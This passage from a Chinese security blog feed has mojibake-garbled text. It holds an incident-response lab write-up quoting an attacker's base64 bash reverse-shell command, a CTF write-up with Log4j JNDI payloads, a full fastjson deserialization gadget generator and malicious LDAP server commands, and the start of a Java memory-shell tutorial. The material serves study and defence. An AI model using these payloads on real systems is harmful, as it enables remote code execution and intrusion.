title="1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell"></a>1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell</h1><p>ç›´æ¥ä¸‹è½½webç›®å½•dç›¾æ‰«<br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241128-003956325.png" class="">  </p><h1 id="2-é»‘å®¢åå¼¹shellçš„ip"><a href="#2-é»‘å®¢åå¼¹shellçš„ip" class="headerlink" title="2.é»‘å®¢åå¼¹shellçš„ip"></a>2.é»‘å®¢åå¼¹shellçš„ip</h1><p>æˆ‘ä»¬æŸ¥çœ‹apacheæ—¥å¿—å¯ä»¥å‘ç°<br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241128-084020837.png" class=""><br>å…¶å…·æœ‰sqlæ³¨å…¥çš„è¡Œä¸ºä¸”åˆ©ç”¨mysqludf.soæ³¨å†Œäº†ä¸€ä¸ªsys_evalå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://192.168.200.31:8005/adminer.php?username=root&amp;sql=select sys_eval(&#x27;echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d&gt;/tmp/1.sh&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>å…¶å†™äº†ä¸€ä¸ªåå¼¹è®¾ç«‹äº†çš„/tmp/1.shæ–‡ä»¶</p><h1 id="3-é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„"><a href="#3-é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„" class="headerlink" title="3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„"></a>3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</h1><p>è¿™é‡Œæˆ‘æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜,å› ä¸ºå…¶æ³¨å†Œudfçš„å‡½æ•°æ˜æ˜æ˜¯mysqludf.soå¯ç­”æ¡ˆå´æ˜¯udf.soæ–‡ä»¶</p><p>é¦–å…ˆæŸ¥è¿è¡Œmysqludf.soæ–‡ä»¶çš„ä½ç½®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;mysqludf.so&quot;</span><br><span class="line">/usr/lib/mysql/plugin/mysqludf.so</span><br></pre></td></tr></table></figure><br>åé¢å‘ç°é”™äº†â€¦.<br>äºæ˜¯å°è¯•åœ¨webç›®å½•ä¸‹æ‰¾mysqlå¯†ç <br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html/ -name <span class="string">&quot;*.php&quot;</span> |xargs grep <span class="string">&quot;root&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241128-084621822.png" class=""><br>ç™»é™†mysql</p><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241128-084723896.png" class="">  <p>å‘ç°é€šè¿‡select * from mysql.funcæŸ¥åˆ°çš„è¡¨é‡Œæ‰€æ³¨å†Œçš„sys_evalå«ä»ç„¶æ˜¯mysqludf.soæ–‡ä»¶æ³¨å†Œçš„,æ‰€æœ‰æä¸æ‡‚ä¸ºä»€ä¹ˆç­”æ¡ˆæ˜¯udf.so</p><h1 id="é»‘å®¢è·å–çš„æƒé™"><a href="#é»‘å®¢è·å–çš„æƒé™" class="headerlink" title="é»‘å®¢è·å–çš„æƒé™"></a>é»‘å®¢è·å–çš„æƒé™</h1><p>ç›´æ¥æ‰§è¡Œsys_eval(â€œwhoamiâ€);å³å¯</p><img src="/2024/11/25/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/IMG_20241128-084946388.png" class="">  <h1 id="æ—¥å¿—åˆ†æ-redisåº”æ€¥å“åº”"><a href="#æ—¥å¿—åˆ†æ-redisåº”æ€¥å“åº”" class="headerlink" title="æ—¥å¿—åˆ†æ-redisåº”æ€¥å“åº”"></a>æ—¥å¿—åˆ†æ-redisåº”æ€¥å“åº”</h1>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç„æœº </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSä¸Šçš„ä¸€äº›javaé¢˜</title>
      <link href="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/"/>
      <url>/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="HZNUCTF-2023-final-ezjava"><a href="#HZNUCTF-2023-final-ezjava" class="headerlink" title="[HZNUCTF 2023 final]ezjava"></a>[HZNUCTF 2023 final]ezjava</h1><img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-170557042.png" class="">  <p>æ‰“å¼€é¶æœºå…¶å‘Šè¯‰æˆ‘ä»¬ä¼šå°†uriçš„å€¼è®¡å…¥log,ä¸”fastjsonçš„ç‰ˆæœ¬ä¸º1.2.48é¦–å…ˆè¿™ä¸ªç‰ˆæœ¬çš„fastjsonæ˜¯ä¸å­˜åœ¨æˆ‘ä»¬æ‰€ä¿—çŸ¥çš„fastjsonååºåˆ—åŒ–æ¼æ´çš„,å…¶åªå­˜åœ¨åŸç”Ÿååºåˆ—åŒ–æ¼æ´,è€Œé¢˜ç›®è¯´ä¼šå°†å†…å®¹è®¡å…¥log,ç€è®©äººæƒ³åˆ°äº†log4jçš„æ¼æ´<br><a href="https://lisien11.xyz/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/">ä»jndiæ³¨å…¥åˆ°log4jæ³¨å…¥</a><br>å…ˆå°è¯•ä»¥ä¸‹payload<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:dns://v73iwpad5ajfj3cacftbwptl7cd31vpk.oastify.com&#125;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-171438881.png" class="">  <p>å¯ä»¥å‘ç°æˆåŠŸè¿›è¡Œäº†dnsè¯·æ±‚è€…å°±è¯æ˜äº†æ­¤å¤„å­˜åœ¨JNDIæ³¨å…¥<br>æˆ‘ä»¬å†æ¢æµ‹ä»¥ä¸‹javaç‰ˆæœ¬<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.v73iwpad5ajfj3cacftbwptl7cd31vpk.oastify.com&#125;</span><br></pre></td></tr></table></figure></p><img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-171907554.png" class="">  <p>å¯ä»¥å‘ç°å…¶ç‰ˆæœ¬ä¸º1.8.0.222è¿™ä¸ªç‰ˆæœ¬çš„javaæ˜¯æ— æ³•ç›´æ¥é€šè¿‡ldapæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„<br>è€Œé¢˜ç›®è¯´å…¶fastjsonçš„ç‰ˆæœ¬ä¸º1.2.48.é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ldapæ¥è§¦å‘fastjsonåŸç”Ÿååºåˆ—åŒ–ä»è€Œå‘½ä»¤æ‰§è¡Œ<br><a href="https://lisien11.xyz/2024/10/19/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjonååºåˆ—åŒ–</a><br>æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨1.2.83çš„payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">v1_2_83</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser_c.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;calc&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        Serializ(hashMap);</span><br><span class="line">        <span class="comment">//Unserializ(&quot;ser_c.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨å¦‚ä¸‹é¡¹ç›®æ­å»ºLdapæœåŠ¡å™¨<br><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">JNDI-Exploit-Bypass-Demo</a><br><img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-173226258.png" class=""><br>æ›¿æ¢ä¸€ä¸‹HackerLDAPRefServer.javaçš„payload<br>ç„¶åå°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br><span class="line">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  0.0.0.0 8088 1389</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=$&#123;jndi:ldap://ip:1389/a&#125;</span><br></pre></td></tr></table></figure><img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-173708621.png" class="">  <img src="/2024/11/24/NSS%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9Bjava%E9%A2%98/IMG_20241124-173724068.png" class="">  <p>æˆåŠŸåå¼¹shell</p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢javaå†…å­˜é©¬</title>
      <link href="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¶å®å¾ˆæ—©å°±æƒ³å­¦ä¹ javaå†…å­˜é©¬çš„çŸ¥è¯†äº†ã€‚è™½ç„¶ç°åœ¨å¯¹javaå®‰å…¨çš„äº†è§£è¿˜å¾ˆæµ…æ˜¾ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸ªäººå¯¹å„ç§é©¬æ¯”è¾ƒæœ‰å…´è¶£ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æƒ³æµ…æ˜¾çš„è®¤è¯†ä¸€ä¸‹å†…å­˜é©¬"><a href="#å…¶å®å¾ˆæ—©å°±æƒ³å­¦ä¹ javaå†…å­˜é©¬çš„çŸ¥è¯†äº†ã€‚è™½ç„¶ç°åœ¨å¯¹javaå®‰å…¨çš„äº†è§£è¿˜å¾ˆæµ…æ˜¾ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸ªäººå¯¹å„ç§é©¬æ¯”è¾ƒæœ‰å…´è¶£ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æƒ³æµ…æ˜¾çš„è®¤è¯†ä¸€ä¸‹å†…å­˜é©¬" class="headerlink" title="å…¶å®å¾ˆæ—©å°±æƒ³å­¦ä¹ javaå†…å­˜é©¬çš„çŸ¥è¯†äº†ã€‚è™½ç„¶ç°åœ¨å¯¹javaå®‰å…¨çš„äº†è§£è¿˜å¾ˆæµ…æ˜¾ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸ªäººå¯¹å„ç§é©¬æ¯”è¾ƒæœ‰å…´è¶£ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æƒ³æµ…æ˜¾çš„è®¤è¯†ä¸€ä¸‹å†…å­˜é©¬"></a>å…¶å®å¾ˆæ—©å°±æƒ³å­¦ä¹ javaå†…å­˜é©¬çš„çŸ¥è¯†äº†ã€‚è™½ç„¶ç°åœ¨å¯¹javaå®‰å…¨çš„äº†è§£è¿˜å¾ˆæµ…æ˜¾ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸ªäººå¯¹å„ç§é©¬æ¯”è¾ƒæœ‰å…´è¶£ï¼Œæ‰€ä»¥è¿™ç¯‡æ–‡ç« æƒ³æµ…æ˜¾çš„è®¤è¯†ä¸€ä¸‹å†…å­˜é©¬</h1><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><p>å­¦å†…å­˜é©¬ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆäº†è§£çš„æ¦‚å¿µæŒºå¤šçš„<br>1.å•¥æ˜¯servlet<br>2.å•¥æ˜¯tomcatï¼Œtomcatçš„ç»“æ„é€»è¾‘åˆæ˜¯å•¥ã€‚</p><h2 id="æˆ‘ä»¬å…ˆæ¥è°ˆä¸€ä¸‹servlet"><a href="#æˆ‘ä»¬å…ˆæ¥è°ˆä¸€ä¸‹servlet" class="headerlink" title="æˆ‘ä»¬å…ˆæ¥è°ˆä¸€ä¸‹servlet"></a>æˆ‘ä»¬å…ˆæ¥è°ˆä¸€ä¸‹servlet</h2><p>servletæ˜¯javawebä¸­ä¸€ä¸ªéå¸¸é‡è¦çš„ç»„ä»¶ï¼Œå…¶å¯ä»¥è·å–å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸å‘ç”Ÿå“åº”åˆ°å®¢æˆ·ç«¯ã€‚</p><h3 id="servletçš„ç”Ÿå‘½å‘¨æœŸ"><a href="#servletçš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="servletçš„ç”Ÿå‘½å‘¨æœŸ"></a>servletçš„ç”Ÿå‘½å‘¨æœŸ</h3><p>Servlet åˆå§‹åŒ–åè°ƒç”¨ init () æ–¹æ³•ã€‚<br>Servlet è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚<br>Servlet é”€æ¯å‰è°ƒç”¨ destroy() æ–¹æ³•ã€‚<br>æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚<br><a href="https://www.runoob.com/servlet/servlet-life-cycle.html">https://www.runoob.com/servlet/servlet-life-cycle.html</a></p><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>å…ˆæ¥ç®€å•å†™å‡ ä¸ªservletçš„demoå§<br>é¦–å…ˆæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹jakarta EEè‡ªå·±ç”Ÿæˆçš„javawebä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.lse.java_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span> <span class="comment">//ä½¿ç”¨webServletæ¥å°†ç±»æ·»åŠ åˆ°è·¯ç”±/hello-servlet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello LSE!&quot;</span>; <span class="comment">//initåˆå§‹åŒ–</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>); <span class="comment">//è®¾ç½®å“åº”æ¨¡å¼</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter(); <span class="comment">//é€šè¿‡getWriteræ¥å¾—åˆ°ä¸€ä¸ªPrintWirterå¯¹è±¡</span></span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>); <span class="comment">//é€šè¿‡printlnè¾“å‡ºå“åº”</span></span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;<span class="comment">//å…³é—­æ•°æ®åº“è¿æ¥å…³é—­åå°è¿›ç¨‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä»£ç æ˜¯ä½¿ç”¨çš„<code>@WebServlet</code>æ¥è¿›è¡Œè·¯ç”±çš„æ˜ å°„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨tomcaté¡¹ç›®ç»“æ„ä¸‹çš„web.xmlæ¥å¯¹è·¯ç”±è¿›è¡Œæ˜ å°„<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-161631343.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä½¿ç”¨çš„æ˜¯doGetæ¥è·å–è¯·æ±‚è¿›è¡Œå“åº”ï¼Œå…¶å®æˆ‘ä»¬ç›´æ¥ä½¿ç”¨serviceä¹Ÿæ˜¯å¯ä»¥çš„</p><p>æˆ‘ä»¬åœ¨èœé¸Ÿæ•™ç¨‹é‡Œçœ‹ä¸€ä¸‹åŸºç¡€çš„çŸ¥è¯†æˆ‘ä»¬å¯ä»¥çŸ¥é“ã€‚serviceå›æ ¹æ®è¯·æ±‚çš„ä¸åŒè€Œåšå‡ºä¸åŒçš„åŠ¨ä½œï¼Œå³å…¶å¯ä»¥å¾—åˆ°GETè¯·æ±‚çš„å†…å®¹ä¹Ÿå¯ä»¥å¾—åˆ°POSTçš„ä¹ƒè‡³PUTçš„ï¼Œè€ŒdoGetå’ŒdoPostçœ‹åå­—ä¹ŸçŸ¥é“å…¶æ˜¯è·å–ä¸“é—¨è¯·æ±‚çš„</p><p>è¿™æ—¶å€™æˆ‘çš„å¥½å¥‡å¿ƒä¸€ä¸‹å°±èµ·æ¥äº†,å½“serviceå’ŒdoGET,doPoståŒæ—¶å­˜åœ¨æ—¶å…¶ä¼šå¦‚ä½•å¤„ç†?</p><p>äºæ˜¯æˆ‘å†™å…¥å¦‚ä¸‹demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.lse.java_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> 